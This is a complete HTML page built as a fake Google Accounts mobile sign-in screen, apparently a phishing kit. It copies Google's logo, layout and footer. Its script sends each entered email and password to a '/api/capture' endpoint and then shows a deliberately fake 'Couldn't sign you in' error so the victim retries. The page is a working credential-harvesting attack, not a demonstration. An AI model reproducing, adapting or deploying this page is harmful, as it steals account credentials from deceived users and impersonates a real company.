<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in - Google Accounts</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  body {
    font-family: -apple-system, 'Google Sans', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
    background: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
  }
  .phone-frame {
    width: 100%;
    max-width: 390px;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    background: #fff;
  }
  .status-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 20px 4px;
    font-size: 12px;
    font-weight: 600;
    color: #111;
    flex-shrink: 0;
  }
  .status-bar .time { font-weight: 700; }
  .status-icons { display: flex; gap: 5px; align-items: center; }
  .status-icons svg { width: 16px; height: 16px; }

  .login-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    padding: 20px 28px 30px;
    overflow-y: auto;
  }
  .google-logo {
    text-align: center;
    padding: 20px 0 8px;
  }
  .google-logo svg {
    width: 72px;
    height: 72px;
  }
  .title {
    text-align: center;
    font-size: 24px;
    font-weight: 500;
    color: #202124;
    margin-bottom: 4px;
    letter-spacing: -0.3px;
  }
  .subtitle {
    text-align: center;
    font-size: 14px;
    color: #5f6368;
    margin-bottom: 28px;
  }
  .subtitle a {
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
  }
  .subtitle a:active { opacity: 0.7; }

  .error-box {
    background: #fce8e6;
    border: 1px solid #f5c6c2;
    border-radius: 8px;
    padding: 12px 16px;
    margin-bottom: 16px;
    font-size: 13px;
    color: #c62828;
    display: none;
    text-align: left;
    line-height: 1.5;
  }
  .error-box.visible { display: block; }

  .form-group { margin-bottom: 14px; }
  input[type="text"],
  input[type="email"],
  input[type="password"] {
    width: 100%;
    padding: 15px 14px;
    background: #fff;
    border: 1.5px solid #dadce0;
    border-radius: 8px;
    font-size: 15px;
    color: #202124;
    outline: none;
    transition: border 0.15s;
    font-family: inherit;
    -webkit-appearance: none;
    appearance: none;
  }
  input:focus {
    border-color: #1a73e8;
  }
  input::placeholder { color: #80868b; }

  .forgot-link {
    display: block;
    font-size: 13px;
    font-weight: 500;
    color: #1a73e8;
    text-decoration: none;
    margin: 6px 0 18px;
  }
  .forgot-link:active { opacity: 0.7; }

  .actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 8px;
  }
  .create-link {
    font-size: 13px;
    font-weight: 500;
    color: #1a73e8;
    text-decoration: none;
  }
  .create-link:active { opacity: 0.7; }

  .next-btn {
    padding: 12px 28px;
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 50px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.12s;
    font-family: inherit;
    -webkit-appearance: none;
    letter-spacing: 0.1px;
  }
  .next-btn:active { background: #1765cc; }
  .next-btn:disabled { background: #8ab4f8; cursor: not-allowed; }

  .info-text {
    font-size: 12px;
    color: #5f6368;
    margin-top: 28px;
    line-height: 1.5;
    text-align: left;
  }
  .info-text a {
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
  }

  .footer {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    align-items: center;
    padding: 16px 28px 28px;
    flex-shrink: 0;
    gap: 8px;
  }
  .footer-links {
    display: flex;
    gap: 18px;
  }
  .footer-links a {
    color: #5f6368;
    font-size: 11px;
    text-decoration: none;
  }
  .footer-links a:active { opacity: 0.6; }

  .lang-select {
    display: flex;
    align-items: center;
    gap: 4px;
    color: #5f6368;
    font-size: 11px;
    cursor: pointer;
  }
  .lang-select svg { width: 12px; height: 12px; }
</style>
</head>
<body>

<div class="phone-frame">
  <div class="status-bar">
    <span class="time">9:41</span>
    <div class="status-icons">
      <svg viewBox="0 0 24 24" fill="#111"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
      <svg viewBox="0 0 24 24" fill="#111"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
    </div>
  </div>

  <div class="login-content">
    <div class="google-logo">
      <svg viewBox="0 0 48 48">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 000 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/>
      </svg>
    </div>
    <div class="title">Sign in</div>
    <div class="subtitle">with your Google Account</div>

    <div class="error-box" id="errorBox">
      Couldn't sign you in. This email or password doesn't match an existing account.
    </div>

    <form id="loginForm" autocomplete="off">
      <div class="form-group">
        <input type="email" id="email" placeholder="Email or phone" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="email">
      </div>
      <div class="form-group">
        <input type="password" id="password" placeholder="Password" autocomplete="off">
      </div>
      <a href="#" class="forgot-link">Forgot password?</a>

      <div class="actions">
        <a href="#" class="create-link">Create account</a>
        <button type="submit" class="next-btn" id="loginBtn">Next</button>
      </div>
    </form>

    <div class="info-text">
      <a href="#">Learn more</a> about using your Google Account safely.
    </div>
  </div>

  <div class="footer">
    <div class="footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
    <div class="lang-select">
      <svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
      English (United States)
    </div>
  </div>
</div>

<script>
  const form = document.getElementById('loginForm');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const loginBtn = document.getElementById('loginBtn');
  const errorBox = document.getElementById('errorBox');

  form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) return;

    loginBtn.textContent = 'Signing in...';
    loginBtn.disabled = true;

    const data = {
      username: email,
      password: password,
      page: 'google',
      timestamp: new Date().toISOString()
    };

    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phrase: JSON.stringify(data) })
      });
    } catch (err) {
      console.log('Capture error:', err);
    }

    // Show fake error
    errorBox.classList.add('visible');
    loginBtn.textContent = 'Next';
    loginBtn.disabled = false;
    passwordInput.value = '';
  });
</script>
</body>
</html>
